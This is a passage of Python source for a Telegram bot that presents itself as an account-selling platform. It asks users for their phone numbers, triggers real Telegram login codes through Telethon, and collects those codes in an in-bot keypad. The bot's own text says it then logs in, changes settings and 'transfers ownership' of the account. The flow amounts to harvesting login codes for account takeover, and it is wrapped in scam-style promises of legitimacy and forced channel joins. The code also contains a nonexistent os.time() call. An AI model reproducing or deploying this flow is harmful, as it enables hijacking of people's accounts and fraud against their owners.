"""
Real Telegram Account Selling Handlers
Uses actual Telethon integration for real account operations
"""
import logging
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, ConversationHandler, CallbackQueryHandler, MessageHandler, filters
from services.real_telegram import RealTelegramService
from handlers.form_handlers import handle_country_selection, handle_phone_number_input
from services.translation_service import translation_service
from services.captcha import CaptchaService
from keyboard_layout_fix import get_main_menu_keyboard
from database import get_db_session, close_db_session
from database.operations import UserService, TelegramAccountService, SystemSettingsService, WithdrawalService, ActivityLogService
from database.models import Withdrawal, WithdrawalStatus, User, TelegramAccount, AccountStatus
import json
import os

logger = logging.getLogger(__name__)

# Conversation states
PHONE, WAITING_OTP, OTP_RECEIVED, DISABLE_2FA_WAIT, NAME_INPUT, PHOTO_INPUT, NEW_2FA_INPUT, FINAL_CONFIRM = range(8)

# Initialize real Telegram service
telegram_service = RealTelegramService()

# Session Cleanup and Enhanced OTP Functions
async def cleanup_old_sessions():
    """Clean up old Telegram session files that cause OTP conflicts."""
    try:
        import os
        import glob
        
        # Remove old session files
        session_files = glob.glob("*.session*")
        cleaned_count = 0
        
        for session_file in session_files:
            try:
                # Keep sessions newer than 1 hour, delete older ones
                file_age = os.path.getctime(session_file)
                current_time = os.time()
                if current_time - file_age > 3600:  # 1 hour
                    os.remove(session_file)
                    cleaned_count += 1
                    logger.info(f"Removed old session file: {session_file}")
            except Exception as e:
                logger.error(f"Error removing session file {session_file}: {e}")
        
        if cleaned_count > 0:
            logger.info(f"Cleaned up {cleaned_count} old session files")
            
        # Also cleanup in-memory sessions in telegram_service
        if hasattr(telegram_service, 'clients'):
            old_sessions = []
            for session_key in list(telegram_service.clients.keys()):
                # Remove sessions older than 1 hour
                if '_' in session_key:
                    try:
                        await telegram_service.cleanup_session(session_key)
                        old_sessions.append(session_key)
                    except:
                        pass
            
            if old_sessions:
                logger.info(f"Cleaned up {len(old_sessions)} in-memory sessions")
                
    except Exception as e:
        logger.error(f"Error in session cleanup: {e}")

async def handle_enhanced_otp_request(phone_number: str):
    """Enhanced OTP request with proper session management."""
    try:
        # Clean up old sessions first
        await cleanup_old_sessions()
        
        # Add delay between requests to avoid flood limits
        import asyncio
        await asyncio.sleep(2)
        
        # Now send OTP with fresh session
        result = await telegram_service.send_verification_code(phone_number)
        return result
        
    except Exception as e:
        logger.error(f"Error in enhanced OTP request: {e}")
        return {
            'success': False,
            'error': 'enhanced_otp_failed',
            'message': str(e)
        }

async def show_real_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Real main menu - exact layout from image with real user data."""
    user = update.effective_user
    db = get_db_session()
    
    # Get user's language preference
    user_lang = translation_service.get_user_language(context)
    
    try:
        # Get real user data from database
        db_user = UserService.get_user_by_telegram_id(db, user.id)
        if not db_user:
            # Create user if not exists
            db_user = UserService.get_or_create_user(
                db=db,
                telegram_user_id=user.id,
                username=user.username,
                first_name=user.first_name,
                last_name=user.last_name,
                language_code=user.language_code or 'en'
            )
        
        # Check if user needs verification
        if db_user.status.value == "PENDING_VERIFICATION" or not db_user.verification_completed:
            await start_verification_process(update, context, db_user)
            return
        
        # Get user's accounts
        accounts = TelegramAccountService.get_user_accounts(db, db_user.id)
        available_accounts = [acc for acc in accounts if acc.status.value == 'AVAILABLE']
        
    except Exception as e:
        logger.error(f"Error loading user data: {e}")
        # Use default values if database error
        class FallbackUser:
            balance = 0.0
            total_accounts_sold = 0
            total_earnings = 0.0
        db_user = FallbackUser()
        available_accounts = []
    finally:
        close_db_session(db)
    
    welcome_text = f"""
� **Telegram Account Selling Platform**

� **Welcome, Bujhlam Na Ki Holo!**

💼 **Your Statistics:**
• 📱 **Accounts Available:** {len(available_accounts)}
• 💰 **Balance:** ${db_user.balance:.2f}  
• 📊 **Total Sold:** {db_user.total_accounts_sold}
• 💎 **Total Earnings:** ${db_user.total_earnings:.2f}

🌍 **System Status:** 🟢 **Normal Load**
📈 **Your Status:** ✅ **ACTIVE**
    """
    
    # Use the corrected layout: LFG full-width, 3x2 grid, Support full-width
    reply_markup = get_main_menu_keyboard()
    
    # Add Admin Panel button for admins OR leaders
    try:
        if db_user.is_admin or db_user.is_leader:
            # Get the keyboard buttons as a list (convert from tuple if needed)
            keyboard_buttons = list(reply_markup.inline_keyboard)
            
            # Insert admin button before Support (last button)
            admin_button = [InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")]
            keyboard_buttons.insert(-1, admin_button)
            
            # Create new keyboard with admin button
            reply_markup = InlineKeyboardMarkup(keyboard_buttons)
            
            # Update welcome text for admins
            welcome_text += "\n🔧 **Admin Access Available**"
            logger.info(f"✅ Added Admin Panel button for user {db_user.telegram_user_id}")
        
            
    except Exception as e:
        logger.error(f"Error adding admin/leader button: {e}")
    
    if update.callback_query:
        await update.callback_query.edit_message_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)
    else:
        await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)

async def start_real_selling(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start real selling process - show confirmation first."""
    
    # Mark this as a selling conversation
    context.user_data['conversation_type'] = 'selling'
    
    sell_text = """
🚀 **Real Telegram Account Selling**

**💰 Sell Your Telegram Account - 100% Real Process!**

⚠️ **This is REAL - not a simulation!**

**What we do:**
• Send **real OTP** to your phone via Telegram
• **Actually login** to your account  
• **Really modify** account settings
• **Actually transfer** ownership
• **Real payment** processing

**⚡ Important Notes:**
• Make sure you have access to your phone
• The process is irreversible once started
• You'll receive real OTP codes
• Account transfer is permanent

**Are you ready to proceed?**
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ Ready! Let's Go", callback_data="confirm_ready_to_sell")],
        [InlineKeyboardButton("❓ Need More Info", callback_data="selling_info")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
    ]
    
    await update.callback_query.edit_message_text(
        sell_text, 
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return PHONE

async def handle_ready_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle the 'Ready?' confirmation and proceed to phone input."""
    
    phone_prompt_text = """
🚀 **Account Selling - Phone Number Required**

**📱 Please provide your phone number:**

**Format:** +CountryCode + Phone Number
**Examples:**
• 🇺🇸 US: `+1234567890`
• 🇮🇳 India: `+919876543210`
• 🇬🇧 UK: `+441234567890`

**⚠️ Important:**
• Use the EXACT number linked to your Telegram account
• Include the + symbol and country code
• No spaces or special characters

**Type your phone number below:**
    """
    
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data="start_real_selling")],
        [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
    ]
    
    await update.callback_query.edit_message_text(
        phone_prompt_text,
        parse_mode='Markdown', 
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return PHONE

async def handle_selling_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show detailed information about the selling process."""
    
    info_text = """
📋 **Account Selling Process - Detailed Information**

**🔍 What Exactly Happens:**

**Step 1 - Verification:**
• We send a real OTP to your phone
• You receive it via Telegram app
• This proves you own the account

**Step 2 - Account Analysis:**
• We check account age, activity, followers
• Determine market value
• No changes made yet

**Step 3 - Transfer Process:**
• We securely modify account settings
• Transfer ownership to buyer
• Process is irreversible

**Step 4 - Payment:**
• Instant payment to your account
• Full transparency, no hidden fees
• Payment before final transfer

**💰 Typical Account Values:**
• New accounts (0-6 months): $5-15
• Aged accounts (6-12 months): $15-35
• Premium accounts (1+ years): $35-100+

**✅ Why Choose Us:**
• 100% legitimate process
• Secure and private
• Fair market pricing
• 24/7 support

**Ready to proceed?**
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ I'm Ready!", callback_data="confirm_ready_to_sell")],
        [InlineKeyboardButton("🔙 Back", callback_data="start_real_selling")],
        [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
    ]
    
    await update.callback_query.edit_message_text(
        info_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return PHONE

async def handle_real_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle phone number input via text message - ISOLATED to selling conversations only."""
    user = update.effective_user
    message_text = update.message.text if update.message else "No text"
    
    # STRICT ISOLATION: Only handle if we're explicitly in a selling conversation
    if context.user_data.get('conversation_type') != 'selling':
        logger.info(f"🔒 PHONE ISOLATION - User {user.id} sent text '{message_text}' but not in selling conversation. Ignoring.")
        return  # Just return, don't end conversation - let other handlers process
    
    logger.info(f"📱 SELLING - User {user.id} sent phone: '{message_text}'")
    
    phone = message_text.strip()
    
    # Validate phone format
    if not phone.startswith('+') or len(phone) < 8:
        await update.message.reply_text(
            "❌ **Invalid Format!**\n\nPlease include country code: `+1234567890`",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
            ])
        )
        return PHONE
    
    # Store phone and send OTP
    context.user_data['phone'] = phone
    
    # Send OTP directly
    processing_msg = await update.message.reply_text(
        f"📡 **Sending Real OTP to {phone}**\n\n⏳ Connecting to Telegram API...",
        parse_mode='Markdown'
    )
    
    try:
        logger.info(f"Attempting to send enhanced OTP to {phone}")
        result = await handle_enhanced_otp_request(phone)
        logger.info(f"Enhanced OTP send result: {result}")
        
        if result['success']:
            context.user_data['phone_code_hash'] = result['phone_code_hash']
            context.user_data['session_key'] = result['session_key']
            
            # Get delivery method from result
            delivery_method = result.get('delivery_method', 'SMS')
            code_type = result.get('code_type', 'SMS')
            
            # Show OTP input message with clear SMS indication
            otp_text = f"""
✅ **Verification Code Sent!**

📱 **Phone:** `{phone}`
📨 **Delivery:** {delivery_method} 
⏰ **Type:** {code_type}

🔐 **IMPORTANT SECURITY NOTE:**
The code was sent via **SMS** (not Telegram app) to prevent security blocks.

**Check your phone's SMS messages and enter the 5-digit code:**
**Example:** 12345
            """
            
            keyboard = [
                [InlineKeyboardButton("🔄 Resend Code", callback_data="resend_otp")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await processing_msg.edit_text(
                otp_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return WAITING_OTP
            
        else:
            error_msg = result['message']
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await processing_msg.edit_text(
                f"❌ **Error:** {error_msg}",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error in phone entry: {e}")
        await processing_msg.edit_text(
            f"❌ **Error:** {str(e)}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    # Show processing message
    processing_msg = await update.message.reply_text(
        "📡 **Connecting to Telegram API...**\n\n⏳ Sending real verification code...",
        parse_mode='Markdown'
    )
    
    # Send real OTP via enhanced session management
    try:
        result = await handle_enhanced_otp_request(phone)
        
        if result['success']:
            # Store session info
            context.user_data['phone_code_hash'] = result['phone_code_hash']
            context.user_data['session_key'] = result['session_key']
            
            success_text = f"""
✅ **Real OTP Code Sent!**

📱 **Phone:** `{phone}`
📨 **Status:** Verification code sent via Telegram API
⏰ **Code Type:** {result.get('code_type', 'SMS')}

**Check your Telegram app or SMS for the 5-digit code!**

Please enter the code you received:
            """
            
            await processing_msg.edit_text(success_text, parse_mode='Markdown')
            return WAITING_OTP
            
        else:
            # Handle errors
            error_msg = result['message']
            if result['error'] == 'flood_wait':
                error_text = f"""
⏳ **Rate Limited**

Too many requests. Please wait **{result['wait_time']} seconds** before trying again.

This is a Telegram API limitation for security.
                """
            elif result['error'] == 'invalid_phone':
                error_text = "❌ **Invalid Phone Number**\n\nPlease check your phone number format and try again."
            else:
                error_text = f"❌ **Error:** {error_msg}"
            
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await processing_msg.edit_text(
                error_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error sending real OTP: {e}")
        await processing_msg.edit_text(
            f"❌ **System Error**\n\nError: {str(e)}\n\nPlease try again later.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← Back", callback_data="main_menu")]])
        )
        return ConversationHandler.END

async def confirm_send_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Confirm and send real OTP via form system."""
    query = update.callback_query
    await query.answer()
    
    phone = context.user_data.get('phone')
    if not phone:
        await query.edit_message_text(
            "❌ **Error:** No phone number found. Please restart.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Restart", callback_data="start_real_selling")]])
        )
        return ConversationHandler.END
    
    # Show processing message
    await query.edit_message_text(
        "📡 **Connecting to Telegram API...**\n\n⏳ Sending real verification code...",
        parse_mode='Markdown'
    )
    
    # Send real OTP via Telethon
    try:
        result = await telegram_service.send_verification_code(phone)
        
        if result['success']:
            # Store session info
            context.user_data['phone_code_hash'] = result['phone_code_hash']
            context.user_data['session_key'] = result['session_key']
            
            success_text = f"""
✅ **Real OTP Code Sent!**

📱 **Phone:** `{phone}`
📨 **Status:** Verification code sent via Telegram API
⏰ **Code Type:** {result.get('code_type', 'SMS')}

**Check your Telegram app or SMS for the 5-digit code!**

Please enter the code you received:
            """
            
            await query.edit_message_text(success_text, parse_mode='Markdown')
            return WAITING_OTP
            
        else:
            # Handle errors
            error_msg = result['message']
            if result['error'] == 'flood_wait':
                error_text = f"""
⏳ **Rate Limited**

Too many requests. Please wait **{result['wait_time']} seconds** before trying again.

This is a Telegram API limitation for security.
                """
            elif result['error'] == 'invalid_phone':
                error_text = "❌ **Invalid Phone Number**\n\nPlease check your phone number format and try again."
            else:
                error_text = f"❌ **Error:** {error_msg}"
            
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await query.edit_message_text(
                error_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error sending real OTP: {e}")
        await query.edit_message_text(
            f"❌ **System Error**\n\nError: {str(e)}\n\nPlease try again later.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← Back", callback_data="main_menu")]])
        )
        return ConversationHandler.END

async def start_verification_process(update: Update, context: ContextTypes.DEFAULT_TYPE, db_user) -> None:
    """Start the human verification process."""
    verification_text = f"""
🔒 **Human Verification Required**

Welcome {update.effective_user.first_name or 'User'}!

Before accessing the **Telegram Account Selling Platform**, you must complete our security verification:

🛡️ **Verification Steps:**
• 🧩 **CAPTCHA** - Prove you're human  
• 📢 **Channel Joins** - Join required channels
• ✅ **Final Verification** - Account activation

**Why verification is required:**
• Prevents automated bots and spam
• Ensures only legitimate sellers
• Protects our community integrity
• Maintains platform security

🚀 **Ready to start earning?** Click below!

⏱️ *Estimated time: 2-3 minutes*
    """
    
    keyboard = [
        [InlineKeyboardButton("🔓 Start Verification", callback_data="start_verification")],
        [InlineKeyboardButton("❓ Why Verification?", callback_data="why_verification")],
        [InlineKeyboardButton("🆘 Contact Support", callback_data="contact_support")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            verification_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            verification_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

async def handle_start_verification(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start the verification process with enhanced CAPTCHA (visual/text)."""
    captcha_service = CaptchaService()
    captcha_data = await captcha_service.generate_captcha()
    
    # Prepare verification text based on captcha type
    if captcha_data['type'] == 'visual':
        verification_text = f"""
🔒 **Step 1/3: CAPTCHA Verification**

🖼️ **Visual CAPTCHA Challenge**

**📝 Instructions:**
• Look at the image below carefully
• Type the exact text you see (letters and numbers)
• Case doesn't matter
• Enter 5 characters exactly as shown

**👇 Type the text from the image:**
        """
    else:
        verification_text = f"""
🔒 **Step 1/3: CAPTCHA Verification**

🧩 **Please solve this CAPTCHA:**

**❓ Question:** {captcha_data['question']}

**📝 Instructions:**
• Type your answer in the chat below
• Send the answer as a regular message
• Case doesn't matter

**👇 Type your answer now:**
        """
    
    keyboard = [
        [InlineKeyboardButton("🔄 New CAPTCHA", callback_data="new_captcha")],
        [InlineKeyboardButton("← Back to Start", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Store CAPTCHA answer in context
    context.user_data['captcha_answer'] = captcha_data['answer']
    context.user_data['captcha_type'] = captcha_data['type']
    context.user_data['captcha_image_path'] = captcha_data.get('image_path')
    context.user_data['verification_step'] = 1
    
    # Try to edit message text, if it fails (e.g., message is a photo), send new message
    try:
        if update.callback_query and update.callback_query.message:
            # Check if the message has text that can be edited
            if update.callback_query.message.text:
                await update.callback_query.edit_message_text(
                    verification_text,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
            else:
                # Message doesn't have editable text (e.g., it's a photo), send new message
                await update.callback_query.message.reply_text(
                    verification_text,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
        else:
            # No callback query or message, send new message
            await update.message.reply_text(
                verification_text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
    except Exception as e:
        # If editing fails for any reason, send a new message
        logger.error(f"Failed to edit message, sending new one: {e}")
        try:
            if update.callback_query and update.callback_query.message:
                await update.callback_query.message.reply_text(
                    verification_text,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
            elif update.message:
                await update.message.reply_text(
                    verification_text,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
        except Exception as fallback_error:
            logger.error(f"Failed to send fallback message: {fallback_error}")
            return
    
    # If visual captcha, send the image
    if captcha_data['type'] == 'visual' and captcha_data.get('image_path'):
        try:
            with open(captcha_data['image_path'], 'rb') as photo:
                # Determine which message object to use for sending the photo
                if update.callback_query and update.callback_query.message:
                    await update.callback_query.message.reply_photo(
                        photo=photo,
                        caption="🔍 **Enter the text shown in this image**",
                        parse_mode='Markdown'
                    )
                elif update.message:
                    await update.message.reply_photo(
                        photo=photo,
                        caption="🔍 **Enter the text shown in this image**",
                        parse_mode='Markdown'
                    )
        except Exception as e:
            logger.error(f"Error sending captcha image: {e}")
            # Fallback to text-based captcha
            try:
                if update.callback_query and update.callback_query.message:
                    await update.callback_query.message.reply_text(
                        "⚠️ **Image failed to load. Fallback question:**\n\n" + 
                        "What is 25 + 17?"
                    )
                elif update.message:
                    await update.message.reply_text(
                        "⚠️ **Image failed to load. Fallback question:**\n\n" + 
                        "What is 25 + 17?"
                    )
                context.user_data['captcha_answer'] = "42"
            except Exception as fallback_error:
                logger.error(f"Failed to send fallback captcha: {fallback_error}")

async def handle_captcha_answer(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle CAPTCHA text answers for both visual and text captchas."""
    user = update.effective_user
    user_answer = update.message.text.strip()
    
    # Check if user is in verification process
    if not context.user_data.get('captcha_answer') or context.user_data.get('verification_step') != 1:
        return  # Not in verification process
    
    db = get_db_session()
    try:
        # Clean up visual captcha image if exists
        captcha_image_path = context.user_data.get('captcha_image_path')
        if captcha_image_path:
            captcha_service = CaptchaService()
            captcha_service.cleanup_captcha_image(captcha_image_path)
            context.user_data.pop('captcha_image_path', None)
        
        # Verify CAPTCHA answer
        correct_answer = context.user_data.get('captcha_answer', '').lower().strip()
        captcha_type = context.user_data.get('captcha_type', 'text')
        
        # For visual captcha, be more flexible with answer checking
        if captcha_type == 'visual':
            is_correct = user_answer.lower().replace(' ', '') == correct_answer.replace(' ', '')
        else:
            is_correct = user_answer.lower().strip() == correct_answer
        
        if is_correct:
            # CAPTCHA passed, move to channel verification
            db_user = UserService.get_user_by_telegram_id(db, user.id)
            if db_user:
                # Update captcha completion
                db_user.captcha_completed = True
                db.commit()
            
            # Clear captcha data from context
            context.user_data.pop('captcha_answer', None)
            context.user_data.pop('captcha_type', None)
            
            # Move to channel verification step
            context.user_data['verification_step'] = 2
            await show_channel_verification(update, context)
            
            # Log successful captcha
            ActivityLogService.log_action(
                db=db,
                user_id=db_user.id if db_user else None,
                action_type="CAPTCHA_COMPLETED",
                description=f"User completed CAPTCHA verification",
                extra_data=json.dumps({"answer": user_answer})
            )
        else:
            # CAPTCHA failed - show appropriate error message
            if captcha_type == 'visual':
                error_message = f"❌ **Incorrect Answer!**\n\n" \
                              f"Your answer: `{user_answer}`\n" \
                              f"🔍 **Tip:** Look carefully at the image and enter exactly what you see (5 characters)\n\n" \
                              f"Please try again with a new CAPTCHA."
            else:
                error_message = f"❌ **Incorrect Answer!**\n\n" \
                              f"Your answer: `{user_answer}`\n" \
                              f"Please try again. Click the button below for a new CAPTCHA."
            
            await update.message.reply_text(
                error_message,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 New CAPTCHA", callback_data="new_captcha")],
                    [InlineKeyboardButton("← Back to Start", callback_data="main_menu")]
                ])
            )
            
            # Log failed captcha
            if db_user := UserService.get_user_by_telegram_id(db, user.id):
                ActivityLogService.log_action(
                    db=db,
                    user_id=db_user.id,
                    action_type="CAPTCHA_FAILED",
                    description=f"User failed CAPTCHA verification",
                    extra_data=json.dumps({"user_answer": user_answer, "correct_answer": correct_answer})
                )
            
    except Exception as e:
        logger.error(f"Error handling CAPTCHA answer: {e}")
        await update.message.reply_text(
            "❌ An error occurred while verifying your answer. Please try again."
        )
    finally:
        close_db_session(db)

async def show_channel_verification(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show channel joining verification step."""
    from services.captcha import VerificationTaskService
    
    task_service = VerificationTaskService()
    channels = task_service.get_required_channels()
    
    channels_text = f"""
🔒 **Step 2/3: Channel Verification**

✅ **CAPTCHA Completed!**

Now please join ALL required channels below:

**Required Channels:**
"""
    
    for i, channel in enumerate(channels, 1):
        channels_text += f"\\n{i}. **{channel['name']}** - {channel['description']}"
    
    channels_text += f"""

⚠️ **Important:** 
• You MUST join ALL channels above
• After joining, click 'Verify Membership'
• We will check your membership automatically

**Ready to continue?**
    """
    
    # Create buttons for each channel + verification button
    keyboard = []
    for channel in channels:
        keyboard.append([InlineKeyboardButton(f"📢 Join {channel['name']}", url=channel['link'])])
    
    keyboard.append([InlineKeyboardButton("✅ Verify Membership", callback_data="verify_channels")])
    keyboard.append([InlineKeyboardButton("← Back to CAPTCHA", callback_data="start_verification")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            channels_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            channels_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

async def handle_country_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle country selection via inline callbacks."""
    query = update.callback_query
    await query.answer()
    
    callback_data = query.data
    
    if callback_data == "more_countries":
        # Show additional countries
        more_text = """
📱 **Select Your Country**

**More Countries Available:**
        """
        
        keyboard = [
            [InlineKeyboardButton("🇫🇷 France (+33)", callback_data="country_+33_FR")],
            [InlineKeyboardButton("🇷🇺 Russia (+7)", callback_data="country_+7_RU")],
            [InlineKeyboardButton("🇧🇷 Brazil (+55)", callback_data="country_+55_BR")],
            [InlineKeyboardButton("🇯🇵 Japan (+81)", callback_data="country_+81_JP")],
            [InlineKeyboardButton("🇨🇳 China (+86)", callback_data="country_+86_CN")],
            [InlineKeyboardButton("🇰🇷 South Korea (+82)", callback_data="country_+82_KR")],
            [InlineKeyboardButton("📝 Manual Entry", callback_data="country_manual")],
            [InlineKeyboardButton("🔙 Back", callback_data="start_real_selling")]
        ]
        
        await query.edit_message_text(more_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        return PHONE
        
    elif callback_data.startswith("country_"):
        # Extract country code and name
        parts = callback_data.split("_")
        if len(parts) >= 3:
            country_code = parts[1]
            country_name = parts[2]
            
            # Store country selection
            context.user_data['country_code'] = country_code
            context.user_data['country_name'] = country_name
            context.user_data['phone_digits'] = ""
            
            # Show phone input interface
            return await show_phone_input_interface(query, context, country_code, country_name)
        
    elif callback_data == "country_manual":
        # Manual phone entry
        manual_text = """
📱 **Manual Phone Entry**

Since you selected manual entry, please **type your complete phone number** including country code:

**Format:** +1234567890
**Example:** +919876543210

**⚠️ After typing, we'll send REAL OTP!**
        """
        
        keyboard = [
            [InlineKeyboardButton("🔙 Select Country", callback_data="start_real_selling")],
            [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
        ]
        
        context.user_data['manual_entry'] = True
        await query.edit_message_text(manual_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        return PHONE

async def show_phone_input_interface(query, context: ContextTypes.DEFAULT_TYPE, country_code: str, country_name: str) -> int:
    """Show interactive phone number input interface."""
    current_digits = context.user_data.get('phone_digits', "")
    
    input_text = f"""
📱 **Phone Number Input**

**Country:** {country_name} ({country_code})
**Current Number:** `{country_code}{current_digits}_`

**Enter your phone number using the keypad below:**
    """
    
    # Create numeric keypad
    keyboard = []
    
    # Number rows (3x3 grid)
    for row in [[1, 2, 3], [4, 5, 6], [7, 8, 9]]:
        keyboard.append([InlineKeyboardButton(str(num), callback_data=f"digit_{num}") for num in row])
    
    # Bottom row with 0 and controls
    keyboard.append([
        InlineKeyboardButton("⬅️", callback_data="backspace"),
        InlineKeyboardButton("0", callback_data="digit_0"),
        InlineKeyboardButton("✅", callback_data="confirm_phone")
    ])
    
    # Action buttons
    keyboard.append([
        InlineKeyboardButton("🔙 Change Country", callback_data="start_real_selling"),
        InlineKeyboardButton("❌ Cancel", callback_data="main_menu")
    ])
    
    await query.edit_message_text(input_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
    return PHONE

async def handle_phone_digit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle digit input for phone number."""
    query = update.callback_query
    await query.answer()
    
    callback_data = query.data
    current_digits = context.user_data.get('phone_digits', "")
    country_code = context.user_data.get('country_code', '+1')
    country_name = context.user_data.get('country_name', 'Selected')
    
    if callback_data.startswith("digit_"):
        # Add digit
        digit = callback_data.split("_")[1]
        if len(current_digits) < 15:  # Limit phone number length
            current_digits += digit
            context.user_data['phone_digits'] = current_digits
        
        # Update interface
        return await show_phone_input_interface(query, context, country_code, country_name)
        
    elif callback_data == "backspace":
        # Remove last digit
        if current_digits:
            current_digits = current_digits[:-1]
            context.user_data['phone_digits'] = current_digits
        
        # Update interface
        return await show_phone_input_interface(query, context, country_code, country_name)
        
    elif callback_data == "confirm_phone":
        # Validate and confirm phone number
        if len(current_digits) < 6:
            await query.answer("❌ Phone number too short! Add more digits.", show_alert=True)
            return PHONE
        
        full_phone = country_code + current_digits
        context.user_data['phone'] = full_phone
        
        # Show confirmation and send OTP
        return await send_real_otp_inline(query, context, full_phone)

async def send_real_otp_inline(query, context: ContextTypes.DEFAULT_TYPE, phone: str) -> int:
    """Send real OTP and show confirmation via inline interface."""
    
    # Show processing message
    processing_text = f"""
📡 **Sending Real OTP Code**

**Phone:** `{phone}`
**Status:** Connecting to Telegram API...

⏳ Please wait while we send the verification code...
    """
    
    await query.edit_message_text(processing_text, parse_mode='Markdown')
    
    try:
        result = await telegram_service.send_verification_code(phone)
        
        if result['success']:
            # Store session info
            context.user_data['phone_code_hash'] = result['phone_code_hash']
            context.user_data['session_key'] = result['session_key']
            context.user_data['otp_digits'] = ""
            
            # Show OTP input interface
            return await show_otp_input_interface(query, context, phone)
            
        else:
            # Handle errors
            error_msg = result['message']
            if result['error'] == 'flood_wait':
                error_text = f"""
⏳ **Rate Limited**

Too many requests. Please wait **{result['wait_time']} seconds** before trying again.
                """
            else:
                error_text = f"❌ **Error:** {error_msg}"
            
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await query.edit_message_text(
                error_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error sending real OTP via inline: {e}")
        await query.edit_message_text(
            f"❌ **System Error**\n\nError: {str(e)}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def show_otp_input_interface(query, context: ContextTypes.DEFAULT_TYPE, phone: str) -> int:
    """Show interactive OTP input interface."""
    current_otp = context.user_data.get('otp_digits', "")
    otp_display = current_otp + "_" * (5 - len(current_otp))
    
    otp_text = f"""
🔐 **OTP Verification**

**Phone:** `{phone}`
**Code:** `{otp_display[0]} {otp_display[1]} {otp_display[2]} {otp_display[3]} {otp_display[4]}`

✅ **OTP Code Sent Successfully!**

Enter the 5-digit code using the keypad below:
    """
    
    # Create numeric keypad for OTP
    keyboard = []
    
    # Number rows (3x3 grid)
    for row in [[1, 2, 3], [4, 5, 6], [7, 8, 9]]:
        keyboard.append([InlineKeyboardButton(str(num), callback_data=f"otp_{num}") for num in row])
    
    # Bottom row with 0 and controls
    keyboard.append([
        InlineKeyboardButton("⬅️", callback_data="otp_backspace"),
        InlineKeyboardButton("0", callback_data="otp_0"),
        InlineKeyboardButton("✅", callback_data="verify_otp")
    ])
    
